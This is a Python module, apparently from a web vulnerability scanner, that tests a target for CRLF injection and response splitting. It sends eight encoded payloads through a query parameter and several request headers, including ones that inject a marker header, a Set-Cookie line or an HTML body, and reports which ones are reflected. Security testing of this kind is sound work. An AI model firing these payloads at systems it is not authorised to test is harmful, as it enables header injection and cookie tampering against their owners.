"""crlf — CRLF injection probe via headers/params (response splitting)"""
from core.http import HttpClient

CRLF = "\r\n"
PAYLOADS = [
    "test%0d%0aOmni-Injected: yes",
    "test%0aOmni-Injected: yes",
    "test%0dOmni-Injected: yes",
    "test\r\nOmni-Injected: yes",
    "test%0d%0a%0d%0a<html>injected</html>",
    "test%23%0d%0aOmni-Injected: yes",
    "test%0d%0aSet-Cookie:crlftest=1",
    "%0d%0aOmni-Injected:%20yes",
]

HEADERS = ["X-Custom", "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"]

class Crlf:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        findings = []

        for p in PAYLOADS:
            # in query string
            r = http.get(target + ("&" if "?" in target else "?") + "x=" + p)
            if r:
                if "Omni-Injected" in str(r.headers) or "Omni-Injected" in r.text:
                    findings.append({"location":"query","payload":p})
                    print(f"  [!] CRLF via query: {p[:60]}")
                    logger.finding("crlf","high",f"query {p[:60]}")
            # in headers
            for h in HEADERS:
                r = http.get(target, headers={h: p})
                if r and ("Omni-Injected" in str(r.headers) or "Omni-Injected" in r.text):
                    findings.append({"location":f"header:{h}","payload":p})
                    print(f"  [!] CRLF via {h}: {p[:60]}")
                    logger.finding("crlf","high",f"{h} {p[:60]}")

        print(f"[crlf] {len(findings)}")
        return {"findings": findings}
